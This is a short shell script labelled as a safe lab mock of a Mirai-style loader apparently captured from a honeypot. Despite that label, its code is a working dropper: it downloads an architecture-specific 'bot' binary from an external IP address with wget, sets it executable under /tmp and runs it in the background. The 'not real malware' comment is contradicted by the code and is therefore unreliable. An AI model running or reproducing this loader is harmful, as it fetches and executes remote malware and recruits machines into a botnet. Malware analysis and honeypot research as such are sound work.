#!/bin/sh
# SAFE LAB MOCK — not real malware. Simulated Mirai-style loader for payload analysis.
# Captured from honeypot session c3d4e5f6a7b8
echo "[lab-mock] Mirai-style loader placeholder"
ARCH=$(uname -m 2>/dev/null || echo x86)
wget -q http://103.149.172.88/bot.${ARCH} -O /tmp/bot || true
chmod 777 /tmp/bot 2>/dev/null
/tmp/bot &
